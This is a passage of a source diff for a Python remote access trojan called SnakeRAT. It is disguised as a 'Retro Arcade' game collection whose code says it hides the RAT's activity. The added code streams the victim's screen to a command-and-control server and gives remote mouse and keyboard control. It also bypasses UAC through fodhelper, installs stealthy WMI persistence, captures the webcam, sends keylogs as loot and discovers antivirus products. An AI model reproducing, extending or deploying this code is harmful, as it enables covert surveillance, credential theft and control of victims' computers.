+        """Block or unblock mouse/keyboard (Requires Admin)"""
+        if not IS_WINDOWS: return {'error': 'Block input only supported on Windows'}
+        block = cmd.get('block', True)
+        try:
+            res = ctypes.windll.user32.BlockInput(block)
+            if res == 0: return {'error': 'BlockInput failed (Admin required)'}
+            return {'success': True}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_stream(self, cmd):
+        """Live screen streaming"""
+        action = cmd.get('action', 'start') # start, stop
+        fps = cmd.get('fps', 15)
+        
+        if action == 'start':
+            if getattr(self, '_streaming', False): return {'status': 'Already streaming'}
+            self._streaming = True
+            def stream_thread():
+                try:
+                    import mss
+                    import cv2
+                    import numpy as np
+                    import time
+                    with mss.mss() as sct:
+                        # try to get primary monitor, or just the whole screen
+                        mon_idx = 1 if len(sct.monitors) > 1 else 0
+                        monitor = sct.monitors[mon_idx]
+                        while self._streaming and self.running:
+                            start_ts = time.time()
+                            sct_img = sct.grab(monitor)
+                            img = np.array(sct_img)
+                            
+                            # Limit resolution to max 720p to save bandwidth
+                            h, w = img.shape[:2]
+                            scale = 720 / float(h)
+                            if scale < 1.0:
+                                new_w = int(w * scale)
+                                img = cv2.resize(img, (new_w, 720), interpolation=cv2.INTER_AREA)
+                                
+                            # Convert BGRA to BGR
+                            if img.shape[2] == 4:
+                                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                                
+                            _, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
+                            
+                            payload = {
+                                'type': 'stream_frame',
+                                'data': base64.b64encode(encoded).decode(),
+                            }
+                            # Send frame
+                            if self.connected:
+                                self._send_encrypted(payload)
+                            
+                            # Throttle FPS
+                            elapsed = time.time() - start_ts
+                            delay = (1.0 / fps) - elapsed
+                            if delay > 0:
+                                time.sleep(delay)
+                except Exception as e:
+                    self.logger.error(f"Stream error: {str(e)}")
+                finally:
+                    self._streaming = False
+            
+            threading.Thread(target=stream_thread, daemon=True).start()
+            return {'status': 'Live stream started'}
+        else:
+            self._streaming = False
+            return {'status': 'Live stream stopped'}
+
+    def _handle_input_control(self, cmd):
+        """Remote mouse and keyboard control"""
+        action = cmd.get('action', 'move') # move, click, type
+        x = cmd.get('x', 0)
+        y = cmd.get('y', 0)
+        button = cmd.get('button', 'left') # left, right
+        text = cmd.get('text', '')
+        
+        try:
+            if IS_WINDOWS:
+                if action == 'move':
+                    ctypes.windll.user32.SetCursorPos(x, y)
+                    return {'success': True}
+                elif action == 'click':
+                    # MOUSEEVENTF_LEFTDOWN = 0x0002, MOUSEEVENTF_LEFTUP = 0x0004
+                    # MOUSEEVENTF_RIGHTDOWN = 0x0008, MOUSEEVENTF_RIGHTUP = 0x0010
+                    ctypes.windll.user32.SetCursorPos(x, y)
+                    if button == 'left':
+                        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
+                        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
+                    else:
+                        ctypes.windll.user32.mouse_event(0x0008, 0, 0, 0, 0)
+                        ctypes.windll.user32.mouse_event(0x0010, 0, 0, 0, 0)
+                    return {'success': True}
+                elif action == 'type':
+                    import time
+                    for char in text:
+                        # Simple keybd_event for basic characters
+                        vk = ctypes.windll.user32.VkKeyScanW(ord(char)) & 0xff
+                        ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
+                        ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
+                    return {'success': True}
+            else:
+                return {'error': 'Platform not supported for input control'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _run_autorun(self):
+        """Execute commands from the autorun file"""
+        if not os.path.exists(self._autorun_file): return
+        
+        try:
+            with open(self._autorun_file, 'r') as f:
+                commands = json.load(f)
+            
+            def run_async():
+                time.sleep(5) # Wait for system to stabilize
+                for cmd in commands:
+                    handler = self.command_handlers.get(cmd.get('type'))
+                    if handler:
+                        try: handler(cmd)
+                        except: continue
+            
+            threading.Thread(target=run_async, daemon=True).start()
+        except: pass
+
+    def _handle_set_autorun(self, cmd):
+        """Save commands to the autorun file"""
+        commands = cmd.get('commands', [])
+        try:
+            with open(self._autorun_file, 'w') as f:
+                json.dump(commands, f)
+            return {'success': True, 'count': len(commands)}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_uac_bypass(self, cmd):
+        """Attempt UAC bypass using fodhelper.exe method"""
+        if not IS_WINDOWS: return {'error': 'UAC bypass only supported on Windows'}
+        
+        program = cmd.get('program', sys.executable)
+        try:
+            import winreg
+            # Create the registry structure for fodhelper bypass
+            path = r"Software\Classes\ms-settings\Shell\Open\command"
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE) as key:
+                winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
+                winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            
+            # Trigger the bypass
+            subprocess.run(['C:\\Windows\\System32\\fodhelper.exe'], creationflags=0x08000000)
+            
+            # Clean up after a delay
+            def cleanup():
+                time.sleep(10)
+                try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
+                except: pass
+            threading.Thread(target=cleanup, daemon=True).start()
+            
+            return {'success': True, 'message': 'Bypass triggered'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_wmi_persistence(self, cmd):
+        """Install WMI Event Subscription persistence (Highly stealthy)"""
+        if not IS_WINDOWS: return {'error': 'WMI persistence only supported on Windows'}
+        
+        name = "SnakeUpdate"
+        command = cmd.get('command', sys.executable)
+        
+        ps_script = f"""
+        $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_LocalTime" AND TargetInstance.Minute = 0'}}
+        $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{name}';CommandLineTemplate='{command}'}}
+        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}
+        """
+        
+        try:
+            res = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000)
+            if res.returncode == 0:
+                return {'success': True}
+            return {'error': res.stderr}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_close_browser(self, cmd):
+        """Force close common browsers"""
+        browsers = ['chrome.exe', 'msedge.exe', 'firefox.exe', 'brave.exe', 'opera.exe'] if IS_WINDOWS else ['chrome', 'firefox', 'brave', 'opera']
+        killed = []
+        for proc in psutil.process_iter(['name']):
+            try:
+                if proc.info['name'].lower() in browsers:
+                    proc.kill()
+                    killed.append(proc.info['name'])
+            except: continue
+        return {'success': True, 'killed': list(set(killed))}
+
+    def _handle_av_discovery(self, cmd):
+        """Identify installed security products (Windows)"""
+        if not IS_WINDOWS: return {'error': 'AV discovery only supported on Windows'}
+        
+        try:
+            # Query WMI for AntivirusProduct
+            ps_script = 'Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName, productState'
+            res = subprocess.run(['powershell', '-Command', ps_script], capture_output=True, text=True, creationflags=0x08000000)
+            return {'output': res.stdout}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_list_drives(self, cmd):
+        """List all logical drives and their labels"""
+        drives = []
+        if IS_WINDOWS:
+            import win32api, win32con
+            for drive in win32api.GetLogicalDriveStrings().split('\000'):
+                if drive:
+                    try:
+                        drive_type = win32api.GetDriveType(drive)
+                        # win32con.DRIVE_REMOVABLE, DRIVE_FIXED, etc.
+                        drives.append({
+                            'root': drive,
+                            'type': drive_type,
+                            'label': win32api.GetVolumeInformation(drive)[0]
+                        })
+                    except: continue
+        else:
+            # Simple fallback for linux using mount points
+            with open('/proc/mounts', 'r') as f:
+                for line in f:
+                    parts = line.split()
+                    if parts[1].startswith('/media') or parts[1] == '/':
+                        drives.append({'root': parts[1], 'type': parts[2]})
+        
+        return {'drives': drives}
+
     # Command Handlers
     
     def _handle_shell(self, cmd):
@@ -1999,7 +2678,7 @@ class AdvancedRAT:
             return {'error': str(e)}
     
     def _handle_upload(self, cmd):
-        """Upload file to victim (robust path handling)"""
+        """Upload file to victim with directory auto-creation"""
         filename = cmd.get('filename', '')
         data_b64 = cmd.get('data', '')
         target_path = cmd.get('target_path')
@@ -2008,12 +2687,23 @@ class AdvancedRAT:
             # 1. Resolve target path
             if not target_path:
                 target_path = os.path.join(self.shell_cwd, filename)
-            elif not os.path.isabs(target_path):
-                target_path = os.path.join(self.shell_cwd, target_path)
+            else:
+                # Handle Windows paths correctly
+                if IS_WINDOWS and (":" in target_path or target_path.startswith("\\\\")):
+                    # Absolute Windows path
+                    pass
+                elif not os.path.isabs(target_path):
+                    target_path = os.path.join(self.shell_cwd, target_path)
             
             # 2. If target is a directory, append the original filename
-            if os.path.isdir(target_path):
+            if os.path.isdir(target_path) or target_path.endswith(("\\", "/")):
+                os.makedirs(target_path, exist_ok=True)
                 target_path = os.path.join(target_path, filename)
+            else:
+                # Ensure the parent directory exists
+                parent = os.path.dirname(target_path)
+                if parent:
+                    os.makedirs(parent, exist_ok=True)
                 
             data = base64.b64decode(data_b64)
             
@@ -2022,7 +2712,7 @@ class AdvancedRAT:
                 f.write(data)
             
             self.logger.success(f"File uploaded to: {target_path}")
-            return {'success': True, 'path': target_path, 'size': len(data)}
+            return {'success': True, 'path': target_path, 'size': len(data), 'is_admin': PrivilegeManager.is_admin()}
         except Exception as e:
             self.logger.error(f"Upload failed: {e}")
             return {'error': str(e)}
@@ -2131,7 +2821,14 @@ class AdvancedRAT:
         """Capture from webcam (cross-platform)"""
         try:
             import cv2
-            cap = cv2.VideoCapture(0)
+            # Use CAP_DSHOW on Windows for faster initialization, 0 otherwise
+            cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) if IS_WINDOWS else cv2.VideoCapture(0)
+            
+            # Allow camera to adjust exposure by skipping initial frames
+            # This fixes the "black image" problem - 60 frames is usually ~2 seconds
+            for _ in range(60):
+                cap.read()
+                
             ret, frame = cap.read()
             cap.release()
             
@@ -2221,16 +2918,10 @@ class AdvancedRAT:
             captured = "".join(self.keylog_buffer)
             self.keylog_buffer = [] # Clear after dump
             
-            # Send as loot if it's large
-            if len(captured) > 500:
-                filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-                self._send_loot('keylog', captured.encode(), filename)
-                return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
-            
-            return {
-                'keys': captured if captured else "[ No keys captured since last dump ]",
-                'count': len(captured)
-            }
+            # Always send as loot to satisfy 'no raw data' requirement
+            filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            self._send_loot('keylog', captured.encode(), filename)
+            return {'status': 'sent_as_loot', 'filename': filename, 'count': len(captured)}
             
         if action == 'status':
             return {
@@ -2247,31 +2938,49 @@ class AdvancedRAT:
         return {'error': f'Unknown action: {action}'}
     
     def _handle_persistence(self, cmd):
-        """Install persistence and launch background shadow process"""
+        """Install persistence and immediately launch the shadow process so the
+        C2 connection survives even if this (original) instance is closed."""
         success, details = PersistenceManager.install_persistence()
         if success:
             try:
                 shadow_path = PersistenceManager.get_shadow_path()
                 if shadow_path and os.path.exists(shadow_path):
-                    # Launch shadow process in background
+                    is_frozen = getattr(sys, 'frozen', False)
                     if IS_WINDOWS:
-                        # Find pythonw.exe
-                        exe = sys.executable
-                        if exe.endswith("python.exe"):
-                            exe = exe.replace("python.exe", "pythonw.exe")
-                        subprocess.Popen([exe, shadow_path], 
-                                       creationflags=0x08000000 | 0x00000008, # CREATE_NO_WINDOW | DETACHED_PROCESS
-                                       start_new_session=True)
+                        if is_frozen:
+                            # Frozen exe: launch the copied exe directly — no interpreter needed
+                            # DETACHED_PROCESS (0x8) | CREATE_NO_WINDOW (0x08000000)
+                            subprocess.Popen(
+                                [shadow_path],
+                                creationflags=0x08000008,  # DETACHED + NO_WINDOW
+                                close_fds=True,
+                            )
+                        else:
+                            # Plain .py script: find pythonw.exe for stealth
+                            exe = sys.executable
+                            pythonw = os.path.join(os.path.dirname(exe), "pythonw.exe")
+                            if os.path.exists(pythonw):
+                                exe = pythonw
+                            subprocess.Popen(
+                                [exe, shadow_path],
+                                creationflags=0x08000008,  # DETACHED + NO_WINDOW
+                                close_fds=True,
+                            )
                     else:
-                        subprocess.Popen([sys.executable, shadow_path], 
-                                       start_new_session=True, 
-                                       stdout=subprocess.DEVNULL, 
-                                       stderr=subprocess.DEVNULL)
-                    details.append("Background shadow process activated (Standby mode)")
+                        # Linux / macOS: use a completely detached session
+                        subprocess.Popen(
+                            [sys.executable, shadow_path],
+                            start_new_session=True,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            stdin=subprocess.DEVNULL,
+                        )
+                    details.append("Shadow process launched — connection will survive parent exit")
             except Exception as e:
-                details.append(f"Shadow activation warning: {e}")
-                
+                details.append(f"Shadow launch warning: {e}")
+
         return {'success': success, 'details': details}
+
 
     def _handle_unpersist(self, cmd):
         """Remove persistence"""
@@ -2800,9 +3509,23 @@ pty.spawn("/bin/sh")
             return {'error': str(e)}
 
     def _handle_elevate(self, cmd):
-        """Attempt to elevate privileges"""
+        """Attempt to elevate privileges and respawn"""
+        if PrivilegeManager.is_admin():
+            return {'success': True, 'message': 'Already running as admin', 'is_admin': True}
+            
         success, message = PrivilegeManager.elevate()
-        return {'success': success, 'message': message, 'is_admin': PrivilegeManager.is_admin()}
+        if success:
+            # Schedule the current process to exit so the admin instance can take the port
+            # We wait 2 seconds to ensure the result is sent to C2
+            def delayed_exit():
+                time.sleep(2)
+                self.running = False
+                os._exit(0)
+            
+            threading.Thread(target=delayed_exit, daemon=True).start()
+            return {'success': True, 'message': 'Admin process launched. Connection will restart.', 'is_admin': False}
+        
+        return {'success': False, 'message': message, 'is_admin': False}
 
     def _handle_unelevate(self, cmd):
         """Attempt to drop privileges"""
@@ -2997,68 +3720,32 @@ rm -f "$0"'''
             return {'error': str(e)}
 
 class SnakeGame:
-    """Enhanced Snake Game with better graphics and gameplay"""
-    
-    def __init__(self):
-        pygame.init()
-        
-        # Game configuration
-        self.width = 800
-        self.height = 600
+    """Snake Engine for Arcade Decoy"""
+    def __init__(self, width=800, height=600):
+        self.width, self.height = width, height
         self.grid_size = 20
-        self.fps = 60
-        
-        # Setup display
-        self.screen = pygame.display.set_mode((self.width, self.height))
-        pygame.display.set_caption('Snake Game v2.0')
-        
-        # Colors
         self.colors = {
-            'background': (20, 20, 40),
-            'snake_head': (0, 255, 100),
-            'snake_body': (0, 200, 50),
-            'food': (255, 100, 100),
-            'text': (255, 255, 255),
-            'grid': (40, 40, 60)
+            'background': (20, 20, 40), 'snake_head': (0, 255, 100),
+            'food': (255, 100, 100), 'text': (255, 255, 255), 'grid': (40, 40, 60)
         }
-        
-        # Fonts
-        self.font_large = pygame.font.Font(None, 72)
-        self.font_medium = pygame.font.Font(None, 36)
-        self.font_small = pygame.font.Font(None, 24)
-        
-        # Clock
-        self.clock = pygame.time.Clock()
-        
-        # Initialize RAT in background
-        self.rat = AdvancedRAT()
-        self.logger = self.rat.logger
-        
-        self.logger.info("Initializing game assets...")
-        
-        # Game state
+        self.snake_x = self.snake_y = 0
+        self.dx = self.dy = 0
+        self.snake: List[Tuple[int, int]] = []
+        self.food: Tuple[int, int] = (0, 0)
+        self.score = self.level = 0
+        self.base_speed = self.speed = 0
+        self.game_over = self.paused = False
+        self.logger = logging.getLogger("Snake")
         self.reset_game()
         
-        self.logger.success("Game started successfully")
-        
-        # Start game loop
-        self.run()
-    
     def reset_game(self):
-        """Reset game state"""
-        self.logger.info("Resetting game state...")
-        self.snake_x = self.width // 2
-        self.snake_y = self.height // 2
-        self.dx = self.grid_size
-        self.dy = 0
+        self.snake_x, self.snake_y = self.width // 2, self.height // 2
+        self.dx, self.dy = self.grid_size, 0
         self.snake = [(self.snake_x, self.snake_y)]
         self.food = self._generate_food()
-        self.score = 0
-        self.base_speed = 10
-        self.speed = self.base_speed
-        self.level = 1
-        self.game_over = False
-        self.paused = False
+        self.score, self.level = 0, 1
+        self.base_speed, self.speed = 10, 10
+        self.game_over, self.paused = False, False
     
     def _generate_food(self):
         """Generate food at random position"""
@@ -3075,31 +3762,28 @@ class SnakeGame:
                 return (fx, fy)
     
     def handle_events(self):
-        """Handle pygame events"""
+        """Handle keyboard input for Snake"""
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 return False
-            
             if event.type == pygame.KEYDOWN:
-                if self.game_over:
-                    if event.key == pygame.K_SPACE:
-                        self.reset_game()
-                    elif event.key == pygame.K_ESCAPE:
-                        return False
-                else:
-                    if event.key == pygame.K_UP and self.dy == 0:
+                if event.key == pygame.K_ESCAPE:
+                    return False
+                if event.key == pygame.K_p:
+                    self.paused = not self.paused
+                if self.game_over and event.key == pygame.K_SPACE:
+                    self.reset_game()
+                
+                # Direction changes (prevent 180 turns)
+                if not self.paused:
+                    if event.key in [pygame.K_UP, pygame.K_w] and self.dy == 0:
                         self.dx, self.dy = 0, -self.grid_size
-                    elif event.key == pygame.K_DOWN and self.dy == 0:
+                    elif event.key in [pygame.K_DOWN, pygame.K_s] and self.dy == 0:
                         self.dx, self.dy = 0, self.grid_size
-                    elif event.key == pygame.K_LEFT and self.dx == 0:
+                    elif event.key in [pygame.K_LEFT, pygame.K_a] and self.dx == 0:
                         self.dx, self.dy = -self.grid_size, 0
-                    elif event.key == pygame.K_RIGHT and self.dx == 0:
+                    elif event.key in [pygame.K_RIGHT, pygame.K_d] and self.dx == 0:
                         self.dx, self.dy = self.grid_size, 0
-                    elif event.key == pygame.K_p:
-                        self.paused = not self.paused
-                    elif event.key == pygame.K_ESCAPE:
-                        return False
-        
         return True
     
     def update(self):
@@ -3143,144 +3827,217 @@ class SnakeGame:
             self.logger.warning(f"Game Over! Final Score: {self.score}")
             self.game_over = True
     
-    def draw_grid(self):
-        """Draw background grid"""
+    def draw(self, screen):
+        """Draw everything"""
+        screen.fill(self.colors['background'])
+        # Grid
         for x in range(0, self.width, self.grid_size):
-            pygame.draw.line(self.screen, self.colors['grid'], (x, 0), (x, self.height), 1)
+            pygame.draw.line(screen, self.colors['grid'], (x, 0), (x, self.height), 1)
         for y in range(0, self.height, self.grid_size):
-            pygame.draw.line(self.screen, self.colors['grid'], (0, y), (self.width, y), 1)
-    
-    def draw_snake(self):
-        """Draw snake"""
-        for i, (x, y) in enumerate(self.snake):
-            if i == 0:  # Head
-                color = self.colors['snake_head']
-                pygame.draw.rect(self.screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
-                
-                # Simple eyes
-                if self.dx > 0:  # Moving right
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + 6), 2)
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + self.grid_size - 6), 2)
-                elif self.dx < 0:  # Moving left
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + 6), 2)
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + self.grid_size - 6), 2)
-                elif self.dy > 0:  # Moving down
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + self.grid_size - 6), 2)
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + self.grid_size - 6), 2)
-                elif self.dy < 0:  # Moving up
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + 6, y + 6), 2)
-                    pygame.draw.circle(self.screen, (0, 0, 0), (x + self.grid_size - 6, y + 6), 2)
-            else:
-                # Body
-                intensity = max(50, 255 - (i * 5))
-                color = (0, intensity, 0)
-                pygame.draw.rect(self.screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
-    
-    def draw_food(self):
-        """Draw food"""
-        x, y = self.food
-        # Pulsing effect
+            pygame.draw.line(screen, self.colors['grid'], (0, y), (self.width, y), 1)
+        
+        # Food
+        fx, fy = self.food
         pulse = abs(pygame.time.get_ticks() % 1000 - 500) / 500
         size = int(self.grid_size - 4 + (pulse * 2))
         offset = (self.grid_size - size) // 2
+        pygame.draw.rect(screen, self.colors['food'], (fx + offset, fy + offset, size, size))
         
-        pygame.draw.rect(self.screen, self.colors['food'], 
-                        (x + offset, y + offset, size, size))
-    
-    def draw_text(self):
-        """Draw text overlays"""
-        # Score
-        score_text = self.font_medium.render(f'Score: {self.score}', True, self.colors['text'])
-        self.screen.blit(score_text, (20, 20))
+        # Snake
+        for i, (x, y) in enumerate(self.snake):
+            color = self.colors['snake_head'] if i == 0 else (0, max(50, 255 - (i * 5)), 0)
+            pygame.draw.rect(screen, color, (x + 2, y + 2, self.grid_size - 4, self.grid_size - 4))
         
-        # Level
-        level_text = self.font_small.render(f'Level: {self.level}', True, self.colors['text'])
-        self.screen.blit(level_text, (20, 60))
+        # Overlays
+        score_text = pygame.font.Font(None, 36).render(f'Score: {self.score}', True, self.colors['text'])
+        screen.blit(score_text, (20, 20))
         
-        # Length
-        length_text = self.font_small.render(f'Length: {len(self.snake)}', True, self.colors['text'])
-        self.screen.blit(length_text, (20, 90))
-        
-        # Game over message
         if self.game_over:
             overlay = pygame.Surface((self.width, self.height))
             overlay.set_alpha(128)
             overlay.fill((0, 0, 0))
-            self.screen.blit(overlay, (0, 0))
-            
-            game_over_text = self.font_large.render('GAME OVER', True, (255, 0, 0))
-            text_rect = game_over_text.get_rect(center=(self.width // 2, self.height // 2 - 50))
-            self.screen.blit(game_over_text, text_rect)
-            
-            restart_text = self.font_medium.render('Press SPACE to restart or ESC to quit', 
-                                                  True, self.colors['text'])
-            text_rect = restart_text.get_rect(center=(self.width // 2, self.height // 2 + 20))
-            self.screen.blit(restart_text, text_rect)
-            
-            score_text = self.font_medium.render(f'Final Score: {self.score}', 
-                                                True, self.colors['text'])
-            text_rect = score_text.get_rect(center=(self.width // 2, self.height // 2 - 10))
-            self.screen.blit(score_text, text_rect)
+            screen.blit(overlay, (0, 0))
+            go_text = pygame.font.Font(None, 72).render('GAME OVER', True, (255, 0, 0))
+            screen.blit(go_text, go_text.get_rect(center=(self.width // 2, self.height // 2 - 50)))
+            prompt = pygame.font.Font(None, 36).render('Press SPACE to Restart or ESC to Menu', True, (255, 255, 255))
+            screen.blit(prompt, prompt.get_rect(center=(self.width // 2, self.height // 2 + 20)))
+
+class PongGame:
+    """Pong Engine for Arcade Decoy"""
+    def __init__(self, width=800, height=600):
+        self.width, self.height = width, height
+        self.padx = self.pady = self.cpu_padx = self.cpu_pady = 0
+        self.pad_w = self.pad_h = 0
+        self.ball_x = self.ball_y = self.ball_dx = self.ball_dy = 0
+        self.score = self.cpu_score = 0
+        self.game_over = self.paused = False
+        self.speed = 40
+        self.reset_game()
         
-        # Pause message
-        if self.paused and not self.game_over:
-            pause_text = self.font_large.render('PAUSED', True, self.colors['text'])
-            text_rect = pause_text.get_rect(center=(self.width // 2, self.height // 2))
-            self.screen.blit(pause_text, text_rect)
+    def reset_game(self):
+        self.padx, self.pady = 20, self.height // 2 - 45
+        self.cpu_padx, self.cpu_pady = self.width - 35, self.height // 2 - 45
+        self.pad_w, self.pad_h = 15, 90
+        self.ball_x, self.ball_y = self.width // 2, self.height // 2
+        self.ball_dx, self.ball_dy = 7 * random.choice([-1, 1]), 7 * random.choice([-1, 1])
+        self.score, self.cpu_score = 0, 0
+        self.game_over = False
+        self.paused = False
+
+    def handle_events(self):
+        keys = pygame.key.get_pressed()
+        if not self.paused and not self.game_over:
+            if keys[pygame.K_UP] and self.pady > 0: self.pady -= 8
+            if keys[pygame.K_DOWN] and self.pady < self.height - self.pad_h: self.pady += 8
+        
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT: return False
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_p: self.paused = not self.paused
+                if self.game_over and event.key == pygame.K_SPACE: self.reset_game()
+                if event.key == pygame.K_ESCAPE: return False # Back to menu
+        return True
+
+    def update(self):
+        if self.game_over or self.paused: return
+        self.ball_x += self.ball_dx
+        self.ball_y += self.ball_dy
+        
+        if self.ball_y <= 0 or self.ball_y >= self.height - 15: self.ball_dy *= -1
+        
+        # CPU AI
+        if self.cpu_pady + self.pad_h // 2 < self.ball_y: self.cpu_pady += 6
+        else: self.cpu_pady -= 6
+        
+        # Collisions
+        if self.ball_x <= self.padx + self.pad_w and self.pady < self.ball_y < self.pady + self.pad_h:
+            self.ball_dx *= -1
+            self.ball_dx = int(self.ball_dx * 1.1)
+        if self.ball_x >= self.cpu_padx - 15 and self.cpu_pady < self.ball_y < self.cpu_pady + self.pad_h:
+            self.ball_dx *= -1
+            self.ball_dx = int(self.ball_dx * 1.1)
             
-            pause_text = self.font_small.render('Press P to resume', True, self.colors['text'])
-            text_rect = pause_text.get_rect(center=(self.width // 2, self.height // 2 + 50))
-            self.screen.blit(pause_text, text_rect)
-    
+        if self.ball_x < 0: self.cpu_score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = 7
+        if self.ball_x > self.width: self.score += 1; self.ball_x, self.ball_y = self.width//2, self.height//2; self.ball_dx = -7
+        
+        if self.score >= 5 or self.cpu_score >= 5: self.game_over = True
+
+    def draw(self, screen):
+        screen.fill((10, 10, 10))
+        pygame.draw.rect(screen, (255, 255, 255), (self.padx, self.pady, self.pad_w, self.pad_h))
+        pygame.draw.rect(screen, (255, 255, 255), (self.cpu_padx, self.cpu_pady, self.pad_w, self.pad_h))
+        pygame.draw.circle(screen, (255, 255, 255), (int(self.ball_x), int(self.ball_y)), 10)
+        
+        font = pygame.font.Font(None, 74)
+        text = font.render(f"{self.score}  {self.cpu_score}", True, (255, 255, 255))
+        screen.blit(text, (self.width // 2 - 50, 20))
+        if self.game_over:
+            msg = "YOU WIN!" if self.score > self.cpu_score else "CPU WINS!"
+            win_text = font.render(msg, True, (0, 255, 0) if self.score > self.cpu_score else (255, 0, 0))
+            screen.blit(win_text, win_text.get_rect(center=(self.width//2, self.height//2)))
+
+class ArcadeDecoy:
+    """The central Game Hub that disguises the RAT activities"""
+    def __init__(self):
+        pygame.init()
+        self.width, self.height = 800, 600
+        self.screen = pygame.display.set_mode((self.width, self.height))
+        pygame.display.set_caption("Retro Arcade Collection v1.4")
+        self.clock = pygame.time.Clock()
+        self.rat = AdvancedRAT()
+        self.state = "MENU" # MENU, SNAKE, PONG
+        self.active_game: Any = None
+        
+        self.run()
+
     def run(self):
-        """Main game loop"""
-        running = True
+        while True:
+            if self.state == "MENU":
+                if not self.handle_menu(): break
+            elif self.state == "SNAKE":
+                if not self.active_game: self.active_game = SnakeGame()
+                if not self.active_game.handle_events(): 
+                    self.state = "MENU"; self.active_game = None; continue
+                self.active_game.update()
+                self.active_game.draw(self.screen)
+                pygame.display.flip()
+                self.clock.tick(self.active_game.speed)
+            elif self.state == "PONG":
+                if not self.active_game: self.active_game = PongGame()
+                if not self.active_game.handle_events(): 
+                    self.state = "MENU"; self.active_game = None; continue
+                self.active_game.update()
+                self.active_game.draw(self.screen)
+                pygame.display.flip()
+                self.clock.tick(self.active_game.speed)
+
+    def handle_menu(self):
+        self.screen.fill((20, 20, 30))
+        font_l = pygame.font.Font(None, 64)
+        font_m = pygame.font.Font(None, 32)
         
-        while running:
-            running = self.handle_events()
-            self.update()
-            
-            self.screen.fill(self.colors['background'])
-            self.draw_grid()
-            self.draw_food()
-            self.draw_snake()
-            self.draw_text()
-            
-            pygame.display.flip()
-            self.clock.tick(self.speed)
+        title = font_l.render("RETRO ARCADE", True, (255, 215, 0))
+        self.screen.blit(title, title.get_rect(center=(self.width//2, 100)))
         
-        pygame.quit()
-        sys.exit()
+        options = ["1. Snake Classic", "2. Cyber Pong", "ESC. Quit"]
+        for i, opt in enumerate(options):
+            txt = font_m.render(opt, True, (200, 200, 200))
+            self.screen.blit(txt, txt.get_rect(center=(self.width//2, 250 + i*50)))
+            
+        pygame.display.flip()
+        
+        for event in pygame.event.get():
+            if event.type == pygame.QUIT: return False
+            if event.type == pygame.KEYDOWN:
+                if event.key == pygame.K_1: self.state = "SNAKE"
+                if event.key == pygame.K_2: self.state = "PONG"
+                if event.key == pygame.K_ESCAPE: return False
+        return True
+
+    def _log(self, level, message): # Dummy for back-compat if needed
+        pass
 
 if __name__ == "__main__":
-    # Parse arguments
-    parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
-    parser.add_argument('--host', help='C2 Server Host IP')
-    parser.add_argument('--port', type=int, help='C2 Server Port')
-    args = parser.parse_args()
+    try:
+        # Parse arguments
+        parser = argparse.ArgumentParser(description='Advanced SnakeRAT Client')
+        parser.add_argument('--host', help='C2 Server Host IP', default=C2_HOST)
+        parser.add_argument('--port', type=int, help='C2 Server Port', default=C2_PORT)
+        args = parser.parse_args()
 
-    # Override defaults if provided
-    if args.host:
-        C2_SERVERS[0]['host'] = args.host
-    if args.port:
-        C2_SERVERS[0]['port'] = args.port
+        # Update C2 configuration
+        C2_HOST = args.host
+        C2_PORT = args.port
+        if C2_SERVERS:
+            C2_SERVERS[0]['host'] = C2_HOST
+            C2_SERVERS[0]['port'] = C2_PORT
 
-    # Ensure single instance
-    instance_lock = Singleton()
-    
-    # Detect if running from a persistence shadow location
-    current_path = os.path.abspath(__file__)
-    is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
-    
-    if is_shadow:
-        # Run silently in background without game window
-        rat = AdvancedRAT()
-        try:
+        print(f"[*] Initializing connection to {C2_HOST}:{C2_PORT}...")
+        
+        # Detect Instance Mode
+        if getattr(sys, 'frozen', False):
